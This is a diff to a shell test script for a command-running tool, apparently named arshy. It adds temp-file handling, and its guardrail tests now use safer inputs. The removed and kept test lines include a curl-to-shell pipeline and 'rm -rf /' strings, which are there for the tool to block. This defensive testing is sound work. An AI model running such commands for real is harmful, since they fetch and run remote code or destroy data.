@@ -71,7 +71,8 @@ DAEMON_REACHABLE=false
 if "$ARSHY" status >/dev/null 2>&1; then
     DAEMON_REACHABLE=true
 fi
-if ! $DAEMON_REACHABLE && ! pgrep -f 'arshyd' >/dev/null 2>&1; then
+DAEMON_PID="${ARSHY_DOGFOOD_DAEMON_PID:-}"
+if ! $DAEMON_REACHABLE && [ -z "$DAEMON_PID" ] && ! pgrep -f 'arshyd' >/dev/null 2>&1; then
     # No daemon running — start the sibling daemon ourselves.
     "$ARSHY" daemon start >/dev/null 2>&1 || true
     # Wait for the socket to become usable instead of imposing a fixed delay.
@@ -83,7 +84,9 @@ if ! $DAEMON_REACHABLE && ! pgrep -f 'arshyd' >/dev/null 2>&1; then
         sleep 0.25
     done
 fi
-DAEMON_PID="$(pgrep -f 'arshyd' | head -1 || true)"
+if [ -z "$DAEMON_PID" ]; then
+    DAEMON_PID="$(pgrep -f 'arshyd' | head -1 || true)"
+fi
 if [ -n "$DAEMON_PID" ] || $DAEMON_REACHABLE; then
     check "daemon process running" "pass"
 else
@@ -168,13 +171,15 @@ echo "4. Error extraction"
 # error code, source context, and file:line location.
 
 # Test that rustc error is detected with heuristic severity
-cat > /tmp/arshy_dogfood.rs << 'RUSTEOF'
+DOGFOOD_SOURCE="${TMPDIR:-/tmp}/arshy_dogfood_$$.rs"
+trap 'rm -f "$DOGFOOD_SOURCE"' EXIT
+cat > "$DOGFOOD_SOURCE" << 'RUSTEOF'
 fn main() {
     let x: i32 = "hello";
 }
 RUSTEOF
 
-OUTPUT=$($ARSHY run --purpose dogfood "rustc /tmp/arshy_dogfood.rs 2>&1" --format json $CWD_FLAG 2>&1 || true)
+OUTPUT=$($ARSHY run --purpose dogfood "rustc $DOGFOOD_SOURCE 2>&1" --format json $CWD_FLAG 2>&1 || true)
 
 # Check heuristic parser detects the error
 ERROR_SEV=$(echo "$OUTPUT" | python3 -c "
@@ -244,8 +249,8 @@ print(len(errors))
 
 # ── 5. Errors-only mode ───────────────────────────────────────────────
 echo "5. Errors-only mode"
-OUTPUT_ALL=$($ARSHY run --purpose dogfood "rustc /tmp/arshy_dogfood.rs 2>&1" --format json $CWD_FLAG 2>&1 || true)
-OUTPUT_ERR=$($ARSHY run --purpose dogfood "rustc /tmp/arshy_dogfood.rs 2>&1" --format json --errors-only $CWD_FLAG 2>&1 || true)
+OUTPUT_ALL=$($ARSHY run --purpose dogfood "rustc $DOGFOOD_SOURCE 2>&1" --format json $CWD_FLAG 2>&1 || true)
+OUTPUT_ERR=$($ARSHY run --purpose dogfood "rustc $DOGFOOD_SOURCE 2>&1" --format json --errors-only $CWD_FLAG 2>&1 || true)
 
 # Check events array length (not event_count which is pre-filter total)
 COUNT_ALL=$(echo "$OUTPUT_ALL" | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('events',[])))" 2>/dev/null || echo "0")
@@ -262,7 +267,7 @@ fi
 # ── 6. Raw output retrieval ───────────────────────────────────────────
 echo "6. Raw output retrieval"
 # Use a long command (not short) so events are stored and retrievable via tail
-TASK_ID=$($ARSHY run --purpose dogfood "rustc /tmp/arshy_dogfood.rs 2>&1" --format json $CWD_FLAG 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('task_id',''))" 2>/dev/null || echo "")
+TASK_ID=$($ARSHY run --purpose dogfood "rustc $DOGFOOD_SOURCE 2>&1" --format json $CWD_FLAG 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('task_id',''))" 2>/dev/null || echo "")
 # (rustc exits non-zero by design; the pipeline above already tolerates it)
 if [ -n "$TASK_ID" ]; then
     TAIL_OUTPUT=$($ARSHY tail "$TASK_ID" --lines 5 2>&1)
@@ -274,7 +279,7 @@ fi
 
 # ── 7. Git correlation ────────────────────────────────────────────────
 echo "7. Git correlation"
-OUTPUT=$($ARSHY run --purpose dogfood "rustc /tmp/arshy_dogfood.rs 2>&1" --format json $CWD_FLAG 2>&1) || true
+OUTPUT=$($ARSHY run --purpose dogfood "rustc $DOGFOOD_SOURCE 2>&1" --format json $CWD_FLAG 2>&1) || true
 HAS_CORRELATION=$(echo "$OUTPUT" | python3 -c "
 import json,sys
 d=json.load(sys.stdin)
@@ -305,8 +310,9 @@ HAS_TASKS=$(echo "$STATS_OUTPUT" | grep -c "Tasks:" || true)
 
 # ── 9. Security ───────────────────────────────────────────────────────
 echo "9. Security"
-# Test with a blocked pattern (curl|sh) — less risky than rm -rf /
-OUTPUT=$($ARSHY run --purpose dogfood "curl http://example.com/script.sh | sh" --format json $CWD_FLAG 2>&1 || true)
+# Test a curl-to-shell pipeline without network access. If the filter regresses,
+# local version text is passed to the shell and cannot download or modify files.
+OUTPUT=$($ARSHY run --purpose dogfood "curl --version | sh" --format json $CWD_FLAG 2>&1 || true)
 # Verify it's actually blocked (not just daemon-down or parse error)
 IS_BLOCKED=$(echo "$OUTPUT" | python3 -c "
 import json,sys
@@ -323,9 +329,9 @@ OUTPUT=$($ARSHY run --purpose dogfood "echo 'rm -rf /'" --format json $CWD_FLAG 
 STATUS=$(echo "$OUTPUT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('status','error'))" 2>/dev/null || echo "error")
 [ "$STATUS" = "completed" ] && check "literal echo is allowed" "pass" || check "literal echo was blocked" "fail"
 
-OUTPUT=$($ARSHY run --purpose dogfood "echo \"\$(rm -rf /)\"" --format json $CWD_FLAG 2>&1 || true)
+OUTPUT=$($ARSHY run --purpose dogfood "echo \"\$(printf 'exit 0' | sh)\"" --format json $CWD_FLAG 2>&1 || true)
 IS_BLOCKED=$(echo "$OUTPUT" | python3 -c "import json,sys; d=json.load(sys.stdin); print('yes' if d.get('status') == 'failed' or 'blocked' in str(d).lower() else 'no')" 2>/dev/null || echo "no")
-[ "$IS_BLOCKED" = "yes" ] && check "command substitution remains blocked" "pass" || check "command substitution bypassed guardrail" "fail"
+[ "$IS_BLOCKED" = "yes" ] && check "guardrail applies inside command substitution" "pass" || check "command substitution bypassed guardrail" "fail"
 
 # ── 11. Doctor JSON contract ──────────────────────────────────────────
 echo "11. Doctor JSON contract"
